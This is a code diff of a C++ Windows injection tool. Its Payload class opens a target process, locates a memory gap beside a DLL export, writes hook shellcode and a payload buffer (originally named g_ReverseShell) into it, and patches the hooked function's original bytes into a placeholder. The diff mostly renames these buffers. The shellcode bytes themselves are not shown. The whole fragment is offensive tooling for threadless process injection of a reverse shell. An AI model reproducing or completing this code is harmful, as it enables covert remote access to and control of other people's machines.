@@ -4,6 +4,8 @@
 #include <winternl.h>
 #include "utils/headers/Tools.h"
 
+
+// Executes the payload by instantiating the class
 Payload::Payload(DWORD process, API::API_ACCESS& api, const char* dll, const char* function)
 {
 	Tools tools;
@@ -35,11 +37,11 @@ Payload::Payload(DWORD process, API::API_ACCESS& api, const char* dll, const cha
 	if (hProcess == INVALID_HANDLE_VALUE)
 		tools.ExitProgram("failed to get a handle to the process");
 
-	if (!LocateMemoryGap(hProcess, &uAddress, reinterpret_cast<ULONG_PTR>(pFunctionToHook), sizeof(g_ReverseShell) + sizeof(g_HookShellCode), api))
+	if (!LocateMemoryGap(hProcess, &uAddress, reinterpret_cast<ULONG_PTR>(pFunctionToHook), sizeof(payload) + sizeof(hook), api))
 		tools.ExitProgram("failed to find a memory gap");
 
 
-	if (!WritePayloadBuffer(hProcess, uAddress, (ULONG_PTR)g_HookShellCode, sizeof(g_HookShellCode), (ULONG_PTR)g_ReverseShell, sizeof(g_ReverseShell)))
+	if (!WritePayloadBuffer(hProcess, uAddress, (ULONG_PTR)hook, sizeof(hook), (ULONG_PTR)payload, sizeof(payload)))
 		tools.ExitProgram("failed to write payload buffer");
 
 
@@ -47,9 +49,6 @@ Payload::Payload(DWORD process, API::API_ACCESS& api, const char* dll, const cha
 		tools.ExitProgram("failed to install hook");
 
 }
-
-
-
 
 // Locates a memory gap next to the DLL that exports the hooked function
 bool Payload::LocateMemoryGap(HANDLE hProcess, _Out_ ULONG_PTR* puAddress, uintptr_t pHookedFunction, size_t sPayloadSize, API::API_ACCESS& api) {
@@ -181,7 +180,7 @@ void Payload::PatchHook(void *pExportedFunc) {
 	unsigned long long uOriginalBytes = *(unsigned long long*)pExportedFunc;
 
 	// The place holder (0xaaaaaaaaaaaaaaaa) is at the 22nd byte
-	memcpy(&g_HookShellCode[22], &uOriginalBytes, sizeof(uOriginalBytes));
+	memcpy(&hook[22], &uOriginalBytes, sizeof(uOriginalBytes));
 }
 
 bool Payload::WritePayloadBuffer( HANDLE hProcess, ULONG_PTR uAddress, ULONG_PTR uHookShellcode, size_t sHookShellcodeSize, ULONG_PTR uPayloadBuffer, size_t sPayloadSize)
